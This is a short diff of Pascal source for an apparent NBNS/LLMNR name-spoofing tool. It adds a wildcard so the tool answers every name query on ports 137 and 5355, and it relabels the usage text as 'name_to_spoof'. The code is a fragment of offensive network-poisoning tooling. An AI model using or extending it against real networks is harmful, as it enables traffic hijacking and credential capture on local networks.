@@ -221,7 +221,7 @@ if ntohs(PNBNS_Header(@buf[0]).qdcount)>=1 then  //this is a question
                 writeln('QUESTION_CLASS:$'+inttohex(ntohs(w),2));
                 end;
 
-              if pos(filter,lowercase(stemp))>0 then
+              if (pos(filter,lowercase(stemp))>0) or (filter='*') then
                 begin
                 if dest_port=137 then respond(ntohs(PNBNS_Header(@buf[0]).tid),stemp,raw_sniffer.str_ip,dest_ip,138,src_port);
                 if (type_=1) and (dest_port=5355) then respond(ntohs(PNBNS_Header(@buf[0]).tid),stemp,raw_sniffer.str_ip,dest_ip,5355,src_port);
@@ -324,7 +324,7 @@ End;
 begin
 if paramcount=0 then
   begin
-  writeln('snif localip nbtname');
+  writeln('snif localip name_to_spoof');
   exit;
   end;
 if paramcount<2 then exit;  
